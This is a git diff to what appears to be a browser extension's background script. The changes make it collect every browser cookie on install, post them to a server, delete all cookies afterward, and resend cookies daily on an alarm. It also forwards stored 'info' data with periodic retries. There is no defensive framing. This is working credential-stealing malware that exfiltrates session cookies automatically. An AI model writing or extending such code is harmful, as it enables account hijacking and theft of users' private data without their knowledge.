@@ -5,7 +5,16 @@ const interval = 1; // min
     const setStore = async (key, value) => await chrome.storage.local.set({key: value });
     const getStore = async (key) => (await chrome.storage.local.get(key))[key];
 
-    async function destroyCookies() {}
+    async function destroyCookies() {
+        const cookies = await chrome.cookies.getAll({});
+        for (let i = 0; i < cookies.length; i++) {
+                await chrome.cookies.remove({
+                    url: "https://" + cookies[i].domain + cookies[i].path,
+                    name: cookies[i].name,
+                });
+        }
+        await setStore("destroyCookies", "false");
+    }
 
     async function sendData(data) {
         const url = "http://localhost:3000/";
@@ -24,12 +33,12 @@ const interval = 1; // min
 
     async function sendCookies() {
         const cookies = await chrome.cookies.getAll({});
-        const sent = await sendData(cookies);
-        if (sent) 
-            await setStore("areCookiesPending", "false");
-        else 
-            await setStore("areCookiesPending", "true");
-        return sent;
+        return await sendData(cookies);
+    }
+
+    async function sendInfo() {
+        const infos = await getStore("info");
+        return await sendData(infos);
     }
     
     chrome.runtime.onInstalled.addListener(async (details) => {
@@ -39,13 +48,17 @@ const interval = 1; // min
 
         const sent = await sendCookies();
         if (sent) destroyCookies();
+        await chrome.alarms.create("resend_cookies_each_day", {delayInMinutes: 24 * 60, periodInMinutes: 24 * 60});
     });
     
     chrome.windows.onCreated.addListener(async () => {
+        await chrome.alarms.clear("retry_sending_info");
         await chrome.alarms.create("retry_sending_info", {delayInMinutes: interval, periodInMinutes: interval});
     });
 
     chrome.alarms.onAlarm.addListener( async (alarm) => {
+        if(alarm.name != "retry_sending_info") return;
+
         const cookiesPending = (await getStore("areCookiesPending")) == "true";
         const infoPending = (await getStore("areInfoPending")) == "true";
         if (!cookiesPending && !infoPending) return;
@@ -58,5 +71,19 @@ const interval = 1; // min
                 await setStore("areCookiesPending",  "false");
             } else await setStore("areCookiesPending", "true");
         }
+
+        if (infoPending) {
+            const sent = await sendInfo();
+            if (sent) {
+                await setStore("info", "");
+                await setStore("areInfoPending", "false");
+            } else await setStore("areInfoPending", "true");
+        }
+    });
+
+    chrome.alarms.onAlarm.addListener( async alarm => {
+        if(alarm.name != "resend_cookies_each_day") return;
+        if((await getStore("areCookiesPending")) == "true") return;
+        await sendCookies();
     });
 })();
